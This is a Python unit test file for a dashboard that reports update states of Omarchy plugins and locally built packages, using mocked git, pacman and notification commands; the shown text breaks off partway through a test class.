import json
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import dashboard as dash
from unittest.mock import call

_STATE_DIR = None


def setUpModule():
    # Every test that ends up writing history.json, holds.json or status.json writes it
    # here, never into the real ~/.local/state.
    global _STATE_DIR
    _STATE_DIR = tempfile.TemporaryDirectory()
    dash.STATE = Path(_STATE_DIR.name)
    dash.STATUS_PATH = dash.STATE / 'status.json'
    dash.APPS_PATH = dash.STATE / 'apps.json'
    # Never read the real shell log, and never wait for a reload that is not happening.
    dash.SHELL_LOG_ROOT = dash.STATE / 'no-shell'
    dash.LOAD_SETTLE_SECONDS = 0
    # Never download the real catalog: a full check refreshes it. Tests that want one
    # patch fetch_catalog themselves.
    dash.fetch_catalog = _offline_catalog


def _offline_catalog():
    raise OSError('no network in tests')


def tearDownModule():
    _STATE_DIR.cleanup()


def fake_run(table):
    """Returns a `run()` replacement driven by a {command_prefix_tuple: (rc, out, err)}
    table, matched by the longest prefix of the actual argv -- lets a test say
    "any git -C <dir> fetch" without hardcoding the temp dir path."""
    def _run(args, cwd=None, timeout=20, **_kwargs):
        best = None
        for prefix, result in table.items():
            if tuple(args[:len(prefix)]) == prefix and (best is None or len(prefix) > len(best)):
                best = prefix
        if best is None:
            raise AssertionError('unexpected command: ' + ' '.join(args))
        return table[best]
    return _run


class PluginUpdateStateTests(unittest.TestCase):
    def test_no_git_dir_is_no_repo(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(dash.plugin_update_state(d), ('no-repo', 0, ''))

    def test_fetch_failure_is_unreachable_with_reason(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            with patch.object(dash, 'run', fake_run({('git', '-C', d, 'fetch'): (1, '', 'no network')})):
                self.assertEqual(dash.plugin_update_state(d), ('unreachable', 0, 'no network'))

    def test_matching_head_is_up_to_date(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', 'HEAD'): (0, 'abc123\n', ''),
                ('git', '-C', d, 'rev-parse', 'FETCH_HEAD'): (0, 'abc123\n', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.plugin_update_state(d), ('up-to-date', 0, ''))

    def test_behind_and_clean_reports_behind_with_count(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', 'HEAD'): (0, 'abc123\n', ''),
                ('git', '-C', d, 'rev-parse', 'FETCH_HEAD'): (0, 'def456\n', ''),
                ('git', '-C', d, 'rev-list', '--count', 'HEAD..FETCH_HEAD'): (0, '3\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, '', ''),
                ('git', '-C', d, 'rev-list', '--count', 'FETCH_HEAD..HEAD'): (0, '0\n', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.plugin_update_state(d), ('behind', 3, ''))

    def test_behind_but_dirty_refuses_the_update_button(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', 'HEAD'): (0, 'abc123\n', ''),
                ('git', '-C', d, 'rev-parse', 'FETCH_HEAD'): (0, 'def456\n', ''),
                ('git', '-C', d, 'rev-list', '--count', 'HEAD..FETCH_HEAD'): (0, '3\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, ' M some/file.qml\n', ''),
                ('git', '-C', d, 'rev-list', '--count', 'FETCH_HEAD..HEAD'): (0, '0\n', ''),
                ('git', '-C', d, 'ls-files', '--others'): (0, '', ''),
            }
            with patch.object(dash, 'run', fake_run(table)), \
                 patch.object(dash, 'local_work_carries', return_value=(False, 'some/file.qml')):
                self.assertEqual(dash.plugin_update_state(d), ('dirty', 3, '1 file(s) changed locally'
                                                                ' -- clashes with the update in some/file.qml'))
            # The same edit, when it does not clash, is carried over: a plain Update.
            with patch.object(dash, 'run', fake_run(table)), \
                 patch.object(dash, 'local_work_carries', return_value=(True, '')):
                self.assertEqual(dash.plugin_update_state(d), ('behind', 3, ''))

    def test_mid_rebase_is_in_progress_and_never_fetches(self):
        # The dirty/diverged checks below all run a git status; this one must
        # short-circuit before ever calling `run` at all, since fetching or
        # counting commits mid-rebase names a state that's about to change
        # again the moment the rebase is resolved. fake_run({}) raises on any
        # call, so this also proves fetch is never attempted.
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            (git_dir / 'rebase-merge').mkdir(parents=True)
            (git_dir / 'rebase-merge' / 'onto').write_text('cc65416abc123\n')
            with patch.object(dash, 'run', fake_run({})):
                self.assertEqual(dash.plugin_update_state(d), ('in-progress', 0, 'rebase onto cc65416'))

    def test_diverged_when_clean_but_locally_ahead(self):
        # Clean working tree, but HEAD carries a commit FETCH_HEAD doesn't --
        # `omarchy plugin update`'s fast-forward-only merge would fail on this
        # even though nothing is "dirty", so it must not be reported as plain
        # 'behind' (which would offer an Update button that's doomed to fail).
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', 'HEAD'): (0, 'abc123\n', ''),
                ('git', '-C', d, 'rev-parse', 'FETCH_HEAD'): (0, 'def456\n', ''),
                ('git', '-C', d, 'rev-list', '--count', 'HEAD..FETCH_HEAD'): (0, '2\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, '', ''),
                ('git', '-C', d, 'rev-list', '--count', 'FETCH_HEAD..HEAD'): (0, '1\n', ''),
                ('git', '-C', d, 'ls-files', '--others'): (0, '', ''),
            }
            with patch.object(dash, 'run', fake_run(table)), \
                 patch.object(dash, 'local_work_carries', return_value=(False, '')):
                self.assertEqual(dash.plugin_update_state(d), ('diverged', 2, '1 local commit(s) not upstream'))
            with patch.object(dash, 'run', fake_run(table)), \
                 patch.object(dash, 'local_work_carries', return_value=(True, '')):
                self.assertEqual(dash.plugin_update_state(d), ('behind', 2, ''))


class RepoOperationInProgressTests(unittest.TestCase):
    def test_no_operation_is_empty_string(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            self.assertEqual(dash.repo_operation_in_progress(d), '')

    def test_rebase_merge_names_the_onto_commit(self):
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            (git_dir / 'rebase-merge').mkdir(parents=True)
            (git_dir / 'rebase-merge' / 'onto').write_text('cc65416abc123\n')
            self.assertEqual(dash.repo_operation_in_progress(d), 'rebase onto cc65416')

    def test_rebase_apply_without_onto_file_still_names_rebase(self):
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            (git_dir / 'rebase-apply').mkdir(parents=True)
            self.assertEqual(dash.repo_operation_in_progress(d), 'rebase')

    def test_merge_head_names_merge(self):
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            git_dir.mkdir()
            (git_dir / 'MERGE_HEAD').write_text('abc\n')
            self.assertEqual(dash.repo_operation_in_progress(d), 'merge')

    def test_cherry_pick_head_names_cherry_pick(self):
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            git_dir.mkdir()
            (git_dir / 'CHERRY_PICK_HEAD').write_text('abc\n')
            self.assertEqual(dash.repo_operation_in_progress(d), 'cherry-pick')

    def test_bisect_log_names_bisect(self):
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            git_dir.mkdir()
            (git_dir / 'BISECT_LOG').write_text('git bisect start abc def\n')
            self.assertEqual(dash.repo_operation_in_progress(d), 'bisect')


class AppUpdateStateTests(unittest.TestCase):
    def test_ancestor_means_up_to_date(self):
        # Mirrors rebuild.sh: origin/branch already an ancestor of branch.
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'origin/master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'master'): (0, '', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'HEAD'): (0, '', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('up-to-date', 0, ''))

    def test_not_ancestor_counts_behind(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'origin/master'): (0, 'def\n', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'master'): (1, '', ''),
                ('git', '-C', d, 'rev-list', '--count', 'master..origin/master'): (0, '1\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, '', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('behind', 1, ''))

    def test_behind_but_dirty_refuses_plain_behind(self):
        # rebuild.sh's own rebase step needs a clean tree to `git checkout
        # master`; a dirty one offering a plain "behind" Update button would
        # hand it a checkout that can fail (or silently carry local changes
        # along) instead.
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'origin/master'): (0, 'def\n', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'master'): (1, '', ''),
                ('git', '-C', d, 'rev-list', '--count', 'master..origin/master'): (0, '1\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, ' M PKGBUILD\n', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('dirty', 1, '1 file(s) changed locally'))

    def test_mid_rebase_is_in_progress_and_never_fetches(self):
        # The exact shape found live 2026-09-16: Flea's aarch64-local left
        # mid-rebase by an earlier `rebuild.sh --install` run, with no prior
        # check anywhere in this file for it.
        with tempfile.TemporaryDirectory() as d:
            git_dir = Path(d) / '.git'
            (git_dir / 'rebase-merge').mkdir(parents=True)
            with patch.object(dash, 'run', fake_run({})):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('in-progress', 0, 'rebase'))

    def test_local_branch_ahead_of_aur_is_not_reported_as_behind(self):
        # This is the exact Flea shape: aarch64-local (what's checked out) is
        # meant to diverge ahead of origin/master, and must never be reported
        # as "behind" because of that divergence alone.
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'origin/master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'master'): (0, '', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'HEAD'): (0, '', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                # Note: checked against 'master', never 'aarch64-local'.
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('up-to-date', 0, ''))

    def test_master_has_it_but_the_checked_out_branch_does_not_is_behind(self):
        # Flea after a merge that was started and aborted: `master` was moved (so it
        # contains origin/master) but aarch64-local, which is what gets built, never took
        # it. Comparing master alone called that up to date.
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'origin/master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'master'): (0, '', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'HEAD'): (1, '', ''),
                ('git', '-C', d, 'rev-list', '--count', 'HEAD..origin/master'): (0, '2\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, '', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('behind', 2, ''))

    def test_that_same_case_with_local_edits_is_dirty_not_behind(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            table = {
                ('git', '-C', d, 'fetch'): (0, '', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'rev-parse', '--verify', 'origin/master'): (0, 'abc\n', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'master'): (0, '', ''),
                ('git', '-C', d, 'merge-base', '--is-ancestor', 'origin/master', 'HEAD'): (1, '', ''),
                ('git', '-C', d, 'rev-list', '--count', 'HEAD..origin/master'): (0, '1\n', ''),
                ('git', '-C', d, 'status', '--porcelain'): (0, ' M rebuild.sh\n', ''),
            }
            with patch.object(dash, 'run', fake_run(table)):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'),
                                 ('dirty', 1, '1 file(s) changed locally'))

    def test_app_fetch_failure_is_unreachable_with_reason(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            with patch.object(dash, 'run', fake_run({('git', '-C', d, 'fetch'): (1, '', 'ssh: connect timed out')})):
                self.assertEqual(dash.app_update_state(d, 'master', 'origin'), ('unreachable', 0, 'ssh: connect timed out'))


class DiscoverPluginsTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.plugins = Path(self._tmp.name)
        for pid in ('martythedev-tech.dashboard', 'sslvpn'):
            (self.plugins / pid).mkdir()
        patcher = patch.object(dash, 'PLUGINS_DIR', self.plugins)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_a_plugin_the_shell_still_lists_but_whose_folder_is_gone_is_left_out(self):
        payload = json.dumps([{'id': 'sslvpn', 'firstParty': False},
                              {'id': 'nixfred.cpu-pulse', 'firstParty': False},
                              {'firstParty': False}])
        with patch.object(dash, 'run', return_value=(0, payload, '')):
            self.assertEqual([p['id'] for p in dash.discover_plugins()], ['sslvpn'])

    def test_a_symlinked_plugin_counts_as_there(self):
        (self.plugins / 'linked').symlink_to(self.plugins / 'sslvpn')
        payload = json.dumps([{'id': 'linked', 'firstParty': False}])
        with patch.object(dash, 'run', return_value=(0, payload, '')):
            self.assertEqual([p['id'] for p in dash.discover_plugins()], ['linked'])

    def test_filters_first_party_but_includes_self(self):
        # SELF_ID is no longer excluded here -- the dashboard checks and can
        # update itself; it's cmd_disable/cmd_remove that separately refuse
        # to act on SELF_ID, since those two would pull the shell out from
        # under its own running widget.
        payload = json.dumps([
            {'id': 'omarchy.clock', 'firstParty': True},
            {'id': 'martythedev-tech.dashboard', 'firstParty': False},
            {'id': 'sslvpn', 'firstParty': False, 'name': 'VPN'},
        ])
        with patch.object(dash, 'run', return_value=(0, payload, '')):
            result = dash.discover_plugins()
        self.assertEqual(sorted(p['id'] for p in result), ['martythedev-tech.dashboard', 'sslvpn'])

    def test_non_zero_exit_yields_empty_list(self):
        with patch.object(dash, 'run', return_value=(1, '', 'boom')):
            self.assertEqual(dash.discover_plugins(), [])

    def test_garbage_json_yields_empty_list(self):
        with patch.object(dash, 'run', return_value=(0, 'not json', '')):
            self.assertEqual(dash.discover_plugins(), [])


class CheckAllTests(unittest.TestCase):
    def test_aggregates_and_counts_only_behind_as_updatable(self):
        # plugin_update_state is keyed by directory, not call order: the checks run concurrently.
        with tempfile.TemporaryDirectory() as d:
            home = Path(d)
            with patch.object(Path, 'home', return_value=home), \
                 patch.object(dash, 'discover_plugins', return_value=[
                     {'id': 'a.plugin', 'name': 'A', 'enabled': True, 'canDisable': True},
                     {'id': 'b.plugin', 'name': 'B', 'enabled': False, 'canDisable': True},
                 ]), \
                 patch.object(dash, 'load_apps', return_value=[
                     {'id': 'flea', 'name': 'Flea', 'repoDir': '/x', 'pkgName': 'flea', 'branch': 'master', 'remote': 'origin'},
                 ]), \
                 patch.object(dash, 'manifest_version', return_value='1.0.0'), \
                 patch.object(dash, 'pkg_version', return_value='0.1.6'), \
                 patch.object(dash, 'plugin_update_state',
                              side_effect=lambda d: {'a.plugin': ('behind', 2, ''),
                                                     'b.plugin': ('up-to-date', 0, '')}[Path(d).name]), \
                 patch.object(dash, 'app_update_state', return_value=('dirty', 1, '')), \
                 patch.object(dash, 'refresh_catalog', return_value=({}, 'offline')), \
                 patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
                dash.PLUGINS_DIR = home / '.config/omarchy/plugins'
                state = home / '.local/state/omarchy/plugins/martythedev-tech.dashboard'
                with patch.object(dash, 'STATE', state), patch.object(dash, 'STATUS_PATH', state / 'status.json'):
                    status = dash.check_all()
                    status_written = dash.STATUS_PATH.exists()

            self.assertEqual(status['updatable'], 1)
            ids = {i['id']: i for i in status['items']}
            self.assertEqual(ids['a.plugin']['updateState'], 'behind')
            self.assertEqual(ids['b.plugin']['updateState'], 'up-to-date')
            self.assertEqual(ids['flea']['updateState'], 'dirty')
            self.assertTrue(status_written)
            # No prior status.json existed, so 'a.plugin' becoming 'behind' is
            # new -- notify-send should have fired once.
            notifies = [c for c in run_mock.call_args_list if c.args[0][0] in ('notify-send', 'systemd-run')]
            self.assertEqual(len(notifies), 1)


class LocalCommitsAndInstalledVersionTests(unittest.TestCase):
    def test_local_commit_count_parses_rev_list(self):
        with patch.object(dash, 'run', fake_run({('git', '-C', '/r', 'rev-list', '--count', 'FETCH_HEAD..HEAD'): (0, '92\n', '')})):
            self.assertEqual(dash.local_commit_count('/r', 'FETCH_HEAD'), 92)

    def test_local_commit_count_is_zero_on_failure(self):
        with patch.object(dash, 'run', return_value=(128, '', 'fatal: bad revision')):
            self.assertEqual(dash.local_commit_count('/r', 'FETCH_HEAD'), 0)

    def test_srcinfo_version(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.SRCINFO').write_text(
                'pkgbase = flea\n\tpkgdesc = x\n\tpkgver = 0.3.7\n\tpkgrel = 2\n\npkgname = flea\n')
            self.assertEqual(dash.srcinfo_version(d), '0.3.7-2')

    def test_srcinfo_version_with_epoch(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.SRCINFO').write_text('pkgbase = x\n\tpkgver = 1.0\n\tpkgrel = 1\n\tepoch = 2\n')
            self.assertEqual(dash.srcinfo_version(d), '2:1.0-1')

    def test_srcinfo_version_missing_or_incomplete_is_empty(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(dash.srcinfo_version(d), '')
            (Path(d) / '.SRCINFO').write_text('pkgbase = x\n\tpkgver = 1.0\n')
            self.assertEqual(dash.srcinfo_version(d), '')

    def test_manifest_description(self):
        with tempfile.TemporaryDirectory() as d, patch.object(dash, 'PLUGINS_DIR', Path(d)):
            (Path(d) / 'x').mkdir()
            (Path(d) / 'x' / 'manifest.json').write_text('{"description": "Does a thing"}')
            self.assertEqual(dash.manifest_description('x'), 'Does a thing')
            self.assertEqual(dash.manifest_description('missing'), '')

    def test_pkg_description_reads_pacman_qi(self):
        out = 'Name            : brave-bin\nVersion         : 1:1.98.60-1\nDescription     : Web browser: fast\nArchitecture    : aarch64\n'
        with patch.object(dash, 'run', fake_run({('pacman', '-Qi', 'brave-bin'): (0, out, '')})):
            self.assertEqual(dash.pkg_description('brave-bin'), 'Web browser: fast')
        with patch.object(dash, 'run', return_value=(1, '', 'not found')):
            self.assertEqual(dash.pkg_description('nope'), '')

    def test_app_row_carries_package_description(self):
        item = self._check_app('up-to-date', '0.3.1-2', '\tpkgver = 0.3.1\n\tpkgrel = 2\n', vercmp_out='0')
        self.assertEqual(item['description'], 'A file manager')
        self.assertEqual(self._check_app('up-to-date', '', '')['description'], '')

    def test_installed_older_than_uses_vercmp(self):
        with patch.object(dash, 'run', fake_run({('vercmp', '0.3.9-1', '0.3.10-1'): (0, '-1\n', '')})):
            self.assertTrue(dash.installed_older_than('0.3.9-1', '0.3.10-1'))
        with patch.object(dash, 'run', fake_run({('vercmp',): (0, '0\n', '')})):
            self.assertFalse(dash.installed_older_than('1-1', '1-1'))
        with patch.object(dash, 'run', return_value=(1, '', 'not found')):
            self.assertFalse(dash.installed_older_than('1-1', '2-1'))

    def _check_app(self, state, installed, srcinfo, vercmp_out='-1'):
        with tempfile.TemporaryDirectory() as d:
            if srcinfo:
                (Path(d) / '.SRCINFO').write_text(srcinfo)
            table = {
                ('vercmp',): (0, vercmp_out + '\n', ''),
                ('pacman', '-Qi'): (0, 'Name            : flea\nDescription     : A file manager\n', ''),
                ('git', '-C', d, 'rev-list', '--count', 'origin/master..HEAD'): (0, '21\n', ''),
                ('git', '-C', d, 'show', 'origin/master:.SRCINFO'): (0, 'pkgbase = flea\n\tpkgver = 0.3.1\n\tpkgrel = 2\n', ''),
            }
            with patch.object(dash, 'app_update_state', return_value=(state, 0, '')), \
                 patch.object(dash, 'pkg_version', return_value=installed), \
                 patch.object(dash, 'run', fake_run(table)):
                return dash.check_app({'id': 'flea', 'repoDir': d, 'branch': 'master', 'remote': 'origin'})

    def test_current_source_with_older_package_is_not_installed(self):
        item = self._check_app('up-to-date', '0.3.0-1', '\tpkgver = 0.3.1\n\tpkgrel = 2\n')
        self.assertEqual(item['updateState'], 'not-installed')
        self.assertEqual(item['reason'], 'repo has 0.3.1-2, installed is 0.3.0-1')
        self.assertEqual(item['ahead'], 21)

    def test_matching_package_stays_up_to_date(self):
        item = self._check_app('up-to-date', '0.3.1-2', '\tpkgver = 0.3.1\n\tpkgrel = 2\n', vercmp_out='0')
        self.assertEqual(item['updateState'], 'up-to-date')

    def test_package_not_installed_at_all_is_left_alone(self):
        # pacman -Q failing gives '' -- nothing to compare, and not this check's business.
        item = self._check_app('up-to-date', '', '\tpkgver = 0.3.1\n\tpkgrel = 2\n')
        self.assertEqual(item['updateState'], 'up-to-date')

    def test_behind_is_not_overridden(self):
        item = self._check_app('behind', '0.3.0-1', '\tpkgver = 0.3.1\n\tpkgrel = 2\n')
        self.assertEqual(item['updateState'], 'behind')
        # and the incoming .SRCINFO says what it would install
        self.assertEqual((item['upstreamVersion'], item['versionChange']), ('0.3.1-2', True))

    def test_no_ahead_count_when_upstream_was_never_compared(self):
        # fake_run raises on any git call, proving none is made.
        with patch.object(dash, 'plugin_update_state', return_value=('unreachable', 0, 'offline')), \
             patch.object(dash, 'manifest_version', return_value='1.0'), \
             patch.object(dash, 'run', fake_run({})):
            self.assertEqual(dash.check_plugin({'id': 'x'})['ahead'], 0)

    def test_plugin_ahead_counted_against_fetch_head(self):
        with patch.object(dash, 'plugin_update_state', return_value=('up-to-date', 0, '')), \
             patch.object(dash, 'manifest_version', return_value='0.10.6'), \
             patch.object(dash, 'run', fake_run({('git', '-C', str(dash.PLUGINS_DIR / 'omamail'),
                                                   'rev-list', '--count', 'FETCH_HEAD..HEAD'): (0, '92\n', ''),
                                                  ('git', '-C', str(dash.PLUGINS_DIR / 'omamail'),
                                                   'status'): (0, '', '')})):
            item = dash.check_plugin({'id': 'omamail', 'enabled': True})
        self.assertEqual((item['updateState'], item['ahead']), ('up-to-date', 92))


class CheckAllConcurrencyTests(unittest.TestCase):
    def test_checks_run_side_by_side_and_keep_their_order(self):
        # Each check blocks on a barrier that only opens once three are in flight at once;
        # run one at a time, the first would wait forever (the barrier times out instead).
        import threading
        barrier = threading.Barrier(3, timeout=5)
        def slow_check(p):
            barrier.wait()
            return {'id': p['id'], 'updateState': 'up-to-date'}
        with tempfile.TemporaryDirectory() as d:
            with patch.object(dash, 'discover_plugins', return_value=[{'id': 'p1'}, {'id': 'p2'}, {'id': 'p3'}]), \
                 patch.object(dash, 'load_apps', return_value=[]), \
                 patch.object(dash, 'check_plugin', slow_check), \
                 patch.object(dash, 'refresh_catalog', return_value=({}, '')), \
                 patch.object(dash, 'STATE', Path(d)), patch.object(dash, 'STATUS_PATH', Path(d) / 'status.json'):
                status = dash.check_all()
        self.assertEqual([i['id'] for i in status['items']], ['p1', 'p2', 'p3'])


class NotifyNewUpdatesTests(unittest.TestCase):
    def test_not_installed_counts_as_newly_updatable(self):
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates([{'id': 'flea', 'name': 'Flea', 'updateState': 'not-installed'}], set())
        self.assertEqual(run_mock.call_count, 1)

    def test_fires_only_for_newly_behind_ids(self):
        items = [
            {'id': 'a', 'name': 'A', 'updateState': 'behind'},
            {'id': 'b', 'name': 'B', 'updateState': 'behind'},
            {'id': 'c', 'name': 'C', 'updateState': 'dirty'},
        ]
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates(items, old_behind_ids={'a'})
        run_mock.assert_called_once()
        args = run_mock.call_args.args[0]
        # A waiter in its own transient unit: title, body, then the ids it may update.
        self.assertEqual(args[0], 'systemd-run')
        i = args.index('await-notification')
        self.assertEqual(args[i + 1:], ['Update available', 'B', 'b'])

    def test_falls_back_to_a_plain_notification_without_systemd_run(self):
        calls = []
        def fake(args, **kw):
            calls.append(args)
            return (1, '', 'no systemd') if args[0] == 'systemd-run' else (0, '', '')
        with patch.object(dash, 'run', fake):
            dash.notify_new_updates([{'id': 'a', 'name': 'A', 'updateState': 'behind'}], set())
        self.assertEqual([c[0] for c in calls], ['systemd-run', 'notify-send'])
        self.assertEqual(calls[-1][-2:], ['Update available', 'A'])

    def test_held_items_never_notify(self):
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates([{'id': 'a', 'name': 'A', 'updateState': 'behind', 'held': True}], set())
        run_mock.assert_not_called()

    def test_no_new_ids_means_no_notification(self):
        items = [{'id': 'a', 'name': 'A', 'updateState': 'behind'}]
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates(items, old_behind_ids={'a'})
        run_mock.assert_not_called()

    def test_dirty_and_diverged_never_notify(self):
        items = [{'id': 'a', 'name': 'A', 'updateState': 'dirty'}, {'id': 'b', 'name': 'B', 'updateState': 'diverged'}]
        with patch.object(dash, 'run', return_value=(0, '', '')) as run_mock:
            dash.notify_new_updates(items, old_behind_ids=set())
        run_mock.assert_not_called()


class CmdUpdateDispatchTests(unittest.TestCase):
    def test_known_app_id_runs_its_own_update_command_in_its_repo_dir(self):
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[
                 {'id': 'howdy', 'name': 'Howdy', 'repoDir': '/home/x/Projects/howdy',
                  'updateCmd': ['./rebuild.sh', '--install']},
             ]), \
             patch.object(dash, 'run', return_value=(0, 'built', '')) as run_mock, \
             patch.object(dash, 'check_all'), patch('builtins.print'):
            args = type('A', (), {'id': 'howdy'})()
            dash.cmd_update(args)
        self.assertIn(call(['./rebuild.sh', '--install'], cwd='/home/x/Projects/howdy', timeout=900, stream_log=dash.STATE / 'action.log'), run_mock.call_args_list)

    def test_unknown_id_falls_through_to_omarchy_plugin_update(self):
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[]), \
             patch.object(dash, 'has_local_work', return_value=False), \
             patch.object(dash, 'run', return_value=(0, 'Updated sslvpn.', '')) as run_mock, \
             patch.object(dash, 'check_all'), patch('builtins.print'):
            args = type('A', (), {'id': 'sslvpn'})()
            dash.cmd_update(args)
        self.assertIn(call(['omarchy', 'plugin', 'update', 'sslvpn', '--yes'], timeout=180, stream_log=dash.STATE / 'action.log'), run_mock.call_args_list)

    def test_a_failed_update_reports_what_it_said_and_what_went_wrong(self):
        # rebuild.sh explains a conflict on stdout and git's complaint arrives on stderr;
        # `out or err` showed only the first whenever it had any text.
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[
                 {'id': 'flea', 'name': 'Flea', 'repoDir': '/x', 'updateCmd': ['./rebuild.sh']}]), \
             patch.object(dash, 'run', return_value=(1, 'Merge conflict -- resolve by hand', 'CONFLICT in PKGBUILD')), \
             patch.object(dash, 'check_all'), patch('builtins.print') as printed:
            dash.cmd_update(type('A', (), {'id': 'flea'})())
        result = json.loads(printed.call_args[0][0])
        self.assertFalse(result['ok'])
        self.assertIn('Merge conflict -- resolve by hand', result['message'])
        self.assertIn('CONFLICT in PKGBUILD', result['message'])

    def test_self_id_is_a_normal_update_not_special_cased(self):
        # Self-update is intentional: only disable/remove refuse SELF_ID.
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[]), \
             patch.object(dash, 'has_local_work', return_value=False), \
             patch.object(dash, 'run', return_value=(0, 'Updated.', '')) as run_mock, \
             patch.object(dash, 'check_all'), patch('builtins.print'):
            args = type('A', (), {'id': dash.SELF_ID})()
            dash.cmd_update(args)
        self.assertIn(call(['omarchy', 'plugin', 'update', dash.SELF_ID, '--yes'], timeout=180, stream_log=dash.STATE / 'action.log'), run_mock.call_args_list)


class CmdEnableTests(unittest.TestCase):
    def test_enables_a_plugin_and_refreshes_status(self):
        # Regression: enable/disable used to be the only mutating commands that
        # never called check_all(), so a toggle in the panel could flip the
        # plugin's actual state while status.json (what the Toggle's `checked`
